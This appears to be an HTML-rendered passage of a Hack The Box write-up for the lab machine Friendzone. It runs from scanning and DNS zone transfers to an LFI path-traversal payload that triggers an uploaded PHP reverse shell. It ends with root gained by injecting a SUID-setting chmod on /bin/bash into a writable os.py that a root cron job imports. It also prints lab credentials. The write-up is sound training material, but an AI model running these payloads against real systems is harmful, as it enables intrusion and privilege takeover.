</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   c144:1868:5e8b:468d:fc7d:888b:1123:781c
</span></span><span class=line><span class=cl><span class=p>|</span> SHA-1: 88d2:e8ee:1c2c:dbd3:ea55:2e5e:cdd4:e94c:4c8b:9233
</span></span><span class=line><span class=cl><span class=p>|</span> -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span> MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
</span></span><span class=line><span class=cl><span class=p>|</span> VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
</span></span><span class=line><span class=cl><span class=p>|</span> BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
</span></span><span class=line><span class=cl><span class=p>|</span> bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
</span></span><span class=line><span class=cl><span class=p>|</span> MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
</span></span><span class=line><span class=cl><span class=p>|</span> VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
</span></span><span class=line><span class=cl><span class=p>|</span> MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
</span></span><span class=line><span class=cl><span class=p>|</span> hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
</span></span><span class=line><span class=cl><span class=p>|</span> A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
</span></span><span class=line><span class=cl><span class=p>|</span> lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
</span></span><span class=line><span class=cl><span class=p>|</span> 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
</span></span><span class=line><span class=cl><span class=p>|</span> gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
</span></span><span class=line><span class=cl><span class=p>|</span> 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
</span></span><span class=line><span class=cl><span class=p>|</span> ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
</span></span><span class=line><span class=cl><span class=p>|</span> BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
</span></span><span class=line><span class=cl><span class=p>|</span> V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
</span></span><span class=line><span class=cl><span class=p>|</span> TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
</span></span><span class=line><span class=cl><span class=p>|</span> LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
</span></span><span class=line><span class=cl><span class=p>|</span> K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
</span></span><span class=line><span class=cl><span class=p>|</span> Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
</span></span><span class=line><span class=cl><span class=p>|</span> X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
</span></span><span class=line><span class=cl><span class=p>|</span> fv9s+GxKNvsBqDBX
</span></span><span class=line><span class=cl><span class=p>|</span>_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>445/tcp open              syn-ack ttl <span class=m>63</span> Samba smbd 4.7.6-Ubuntu <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: Hosts: FRIENDZONE, 127.0.1.1<span class=p>;</span> OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class=o>(</span>unknown<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Names:
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;00&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;03&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;20&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\x</span>01<span class=se>\x</span>02__MSBROWSE__<span class=se>\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span> Statistics:
</span></span><span class=line><span class=cl><span class=p>|</span>   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1:
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-09-06T15:35:12
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker:
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 60332/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Couldn<span class=s1>&#39;t connect)
</span></span></span><span class=line><span class=cl><span class=s1>|   Check 2 (port 29635/tcp): CLEAN (Couldn&#39;</span>t connect<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 37865/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Failed to receive data<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 49559/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Failed to receive data<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery:
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows 6.1 <span class=o>(</span>Samba 4.7.6-Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: friendzone
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: FRIENDZONE<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Domain name: <span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   FQDN: friendzone
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2023-09-06T18:35:12+03:00
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span></code></pre></div><p>The scan shows 7 ports up and running, 80 and 443 are running web servers, 139 and 445 are smb ports, 22 for ssh, 21 for ftp and 25 is running a ISC service which is a kind of DNS.</p><p>I’ll take careful notice of the domain in the TLS certificate, <code>commonName=friendzone.red</code></p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>As always I am gonna start with the websites.</p><p>First let’s start with the http server.</p><p><img loading=lazy src=/HTB/friend-1.png alt=Untitled></p><p>Te homepage leaks a email with a URL <code>friendzoneportal.red</code> maybe there is virtualhosting in the website.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 13<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>/wordpress            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.123/wordpress/<span class=o>]</span>
</span></span></code></pre></div><p>After a quick fuzz two directories are shown</p><p><code>/robots.txt</code> is troll.</p><p><img loading=lazy src=/HTB/friend-2.png alt=Untitled></p><p><code>/wordpress</code> is empty.</p><p><img loading=lazy src=/HTB/friend-3.png alt=Untitled></p><p>So let’s move to the ssl site.</p><p><img loading=lazy src=/HTB/friend-4.png alt=Untitled></p><p><img loading=lazy src=/HTB/friend-5.png alt=Untitled></p><p>In the homepage we found normal gif but if we access to the source code there is a comment leaking a directory <code>/js/js</code> on development.</p><p><img loading=lazy src=/HTB/friend-6.png alt=Untitled></p><p>The directory <code>/js/js</code> is a page which maybe something is being tested.</p><p>There are also some hidden comments at the source code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Testing some functions !<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>p</span><span class=p>&gt;</span>I&#39;am trying not to break things !<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>SkUyRVFwSlF2VzE2OTQzMzc4MjIybkJLbUE5RVdN
</span></span><span class=line><span class=cl><span class=c>&lt;!-- dont stare too much , you will be smashed ! , it&#39;s all about times and zones ! --&gt;</span>
</span></span></code></pre></div><p>I don’t know what are they referring to, but you have to keep in mind that it could just be a rabbit hole.</p><p>Let’s do a quick fuzz</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u https://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 318<span class=o>]</span> <span class=o>[</span>--&gt; https://friendzone.red/admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 238<span class=o>]</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; https://friendzone.red/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 303<span class=o>]</span>
</span></span></code></pre></div><p>Again, only two directories are displayed</p><p><img loading=lazy src=/HTB/friend-7.png alt=Untitled></p><p><code>/admin</code> is a empty directory as <code>/wordpress</code> in the http site.</p><p><img loading=lazy src=/HTB/friend-8.png alt=Untitled></p><p><code>/js</code> lists only one directory named <code>/js</code> which is the one we have already visited.</p><p>If we return to the nmap scan there, the TCP port 53 is for DNS which means that maybe this is associated with Zone Transfers, where the server give all the information it has for a domain. Before doing any virtual hosting scans I checked Zone Transfers for enumerating DNS.</p><p>As we have two domains let’s see what outputs dig command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dig @10.10.10.123 friendzone.red axfr 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.10.123 friendzone.red axfr
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	AAAA	::1
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	NS	localhost.
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>administrator1.friendzone.red. <span class=m>604800</span> IN A	127.0.0.1
</span></span><span class=line><span class=cl>hr.friendzone.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>uploads.friendzone.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>110</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.123#53<span class=o>(</span>10.10.10.123<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Sun Sep <span class=m>10</span> 12:07:34 CEST <span class=m>2023</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> XFR size: <span class=m>8</span> records <span class=o>(</span>messages 1, bytes 261<span class=o>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dig @10.10.10.123 friendzoneportal.red axfr
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.10.123 friendzoneportal.red axfr
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	AAAA	::1
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	NS	localhost.
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>admin.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>files.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>imports.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>vpn.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>104</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.123#53<span class=o>(</span>10.10.10.123<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Sun Sep <span class=m>10</span> 12:08:07 CEST <span class=m>2023</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> XFR size: <span class=m>9</span> records <span class=o>(</span>messages 1, bytes 281<span class=o>)</span>
</span></span></code></pre></div><p>Cool we have a bunch of possible subdomains, let’s put them on <code>/etc/hosts</code></p><p>First I tried to access to each subdomain with the http port but seem to go back to the same site so I started to do it with ssl site instead.</p><table><thead><tr><th>Domain</th><th>Comments</th></tr></thead><tbody><tr><td>administrator1.friendzone.red</td><td>Seems a admin page</td></tr><tr><td>uploads.friendzone.red</td><td>Fake uploads site</td></tr><tr><td>hr.friendzone.red</td><td>Not Found</td></tr><tr><td>friendzoneportal.red</td><td>Only a GIF of Michael Jackson</td></tr><tr><td>admin.friendzoneportal.red</td><td>When I try to put any creds shows “Admin page is not developed yet !!! check for another one”</td></tr><tr><td>files.friendzoneportal.red</td><td>Not Found</td></tr><tr><td>imports.friendzoneportal.red</td><td>Not Found</td></tr><tr><td>vpn.friendzoneportal.red</td><td>Not Found</td></tr></tbody></table><p><a href=http://administrator1.friendzone.red><code>administrator1.friendzone.red</code></a> is the only one which seems working but need a valid credentials. I tried some common credentials but failed.</p><p>Let’s move now to other ports.</p><p>I started with the ftp service. I tried to log in anonymously but the login failed</p><p>So I decided to try to access to smb instead, using smbmap I can access anonymously and see what permissions I have on the shares.</p><p><img loading=lazy src=/HTB/friend-9.png alt=Untitled></p><p>Interesting the Files shares comment show his directory so we can assume that all the directories are located at <code>/etc</code> without doing any enumeration.</p><p>Thanks to smbmap we also know that general is only readable and Development is readable and writeable.</p><p><img loading=lazy src=/HTB/friend-11.png alt=Untitled></p><p>Development seems empty.</p><p><img loading=lazy src=/HTB/friend-10.png alt=Untitled></p><p>general has only one file with credentials.</p><pre tabindex=0><code>creds for the admin THING:

admin:WORKWORKHhallelujah@#
</code></pre><p>Maybe there are credentials for the admin site.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p><img loading=lazy src=/HTB/friend-12.png alt=Untitled></p><p>Once logged in in the admin page, the site tells yo to visit to the dashboard.</p><p><img loading=lazy src=/HTB/friend-13.png alt=Untitled></p><p>In order to show the image we need to put the two default parameters.</p><p><code>image_id=a.jpg&amp;pagename=timestamp</code></p><p><img loading=lazy src=/HTB/friend-14.png alt=Untitled></p><p>Interesting pagename points to timestamp and if the input is not being sanitized maybe we can change the input to other file.</p><p>I tried to point to the dashboard.php page but the site is not loading.</p><p>After that I realized that the code is putting .php at the end of the input.</p><p><code>image_id=a.jpg&amp;pagename=dashboard</code></p><p><img loading=lazy src=/HTB/friend-15.png alt=Untitled></p><p>The site is loading infinite times so we can assume that we have LFI with php files.</p><p>Now we have LFI and if we remember the samba shares are pointing to folders on the <code>/etc</code> directory so we are able to upload a shell and make it run with the pagename parameter.</p><p>The only share which is writable is the Development folder so I tried to upload a php reverse shell. As always I am gonna using the <a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell>pentestmonkey</a> one</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H 10.10.10.123 --upload <span class=s1>&#39;./shell.php&#39;</span> <span class=s1>&#39;Development\shell.php&#39;</span>
</span></span></code></pre></div><p>Now let’s set a nc listener and run the php reverse shell with the next parameters <code>image_id=a.jpg&amp;pagename=../../../../../../etc/Development/shell</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img loading=lazy src=/HTB/friend-16.png alt=Untitled></p><p>Great we are <strong>www-data</strong> now.</p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p><img loading=lazy src=/HTB/friend-17.png alt=Untitled></p><p>If we check the <code>/var/www</code> directory where are located all the sites we can see a suspicious mysql file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> development process this is the mysql creds <span class=k>for</span> user friend
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_user</span><span class=o>=</span>friend
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_pass</span><span class=o>=</span>Agpyu12!0.213$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_name</span><span class=o>=</span>FZ
</span></span></code></pre></div><p>Seems credentials for access to a mysql database, but let’s see if there is a password reuse.</p><p>I tried to access to the user friend with the command <code>su friend</code></p><p><img loading=lazy src=/HTB/friend-20.png alt=Untitled></p><p>Awesome we are logged as normal user.</p><p><img loading=lazy src=/HTB/friend-19.png alt=Untitled></p><p>Now it’s time to privEsc.</p><p>As always I checked for unusual processes or open ports but I don’t found anything and then I have searched for SUID files to exploit but there was nothing exploitable.</p><p>Once done the initial check I start the scan of scheduled processes with <a href=http://moniProc.sh>moniProc.sh</a> which I have used in a lot of writeups.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&gt; /bin/sh -c /opt/server_admin/reporter.py
</span></span><span class=line><span class=cl>&gt; /usr/bin/python /opt/server_admin/reporter.py
</span></span></code></pre></div><p>A cronjob is executing a python script, let’s check his content.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>to_address</span> <span class=o>=</span> <span class=s2>&#34;admin1@friendzone.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>from_address</span> <span class=o>=</span> <span class=s2>&#34;admin2@friendzone.com&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;[+] Trying to send email to </span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>to_address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &#34;PAPAP&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#os.system(command)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># I need to edit the script later</span>
</span></span><span class=line><span class=cl><span class=c1># Sam ~ python developer</span>
</span></span></code></pre></div><p>The scripts doesn’t seems exploitable but is using the os library, if this library is vulnerable to Library Hijacking we are able to execute whatever we want.</p><p>The attack explanation is simple, the searched python module will be located in one of the defined paths, but if Python finds a module with the <em><strong>same</strong></em> name in a folder with higher priority, it will import that module instead of the “legit” one.</p><p>We can know the Python Path with the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import sys; print(sys.path)&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/plat-x86_64-linux-gnu&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-tk&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-old&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-dynload&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/local/lib/python2.7/dist-packages&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/dist-packages&#39;</span><span class=p>]</span>
</span></span></code></pre></div><p>The first path that python will check will be the script directory, if nothing is located at the script directory python will check all the remaining paths.</p><p><img loading=lazy src=/HTB/friend-21.png alt=Untitled></p><p>As we can’t write anything on the script folder, we need to check if any folder containing os.py module is writable in order to perform the attack.</p><p><img loading=lazy src=/HTB/friend-22.png alt=Untitled></p><p>As we know the first folder python will check is the <code>/usr/lib/python2.7</code>, let’s check if we can modify the module.</p><p><img loading=lazy src=/HTB/friend-23.png alt=Untitled></p><p>We have permissions to edit the file so we can put the following line of code which is going to be executed always when we import the library.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s1>&#39;chmod 4755 /bin/bash&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>As the cronjob is executed as root, we are able to execute commands as the above which helps us to privEsc changing the bash permissions to that of a SUID file.</p><p>Now only rests to wait.</p><p><a href=/HTB/friend-v1.mov>Untitled</a></p><p>If we execute the following command the current bash session is gonna turn to a root session.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bash</span> <span class=o>-</span><span class=n>p</span>
</span></span></code></pre></div><p><img loading=lazy src=/HTB/friend-24.png alt=Untitled></p><p><img loading=lazy src=/HTB/friend-25.png alt=Untitled></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/linux/>linux</a></li></ul><nav class=paginav><a class=next href=https://pwndside.github.io/posts/bounty-htb/><span class=title>Next »</span><br><span>Bounty</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on twitter" href="https://twitter.com/intent/tweet/?text=Friendzone&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f&amp;hashtags=privesc%2cweb%2clinux"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f&amp;title=Friendzone&amp;summary=Friendzone&amp;source=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 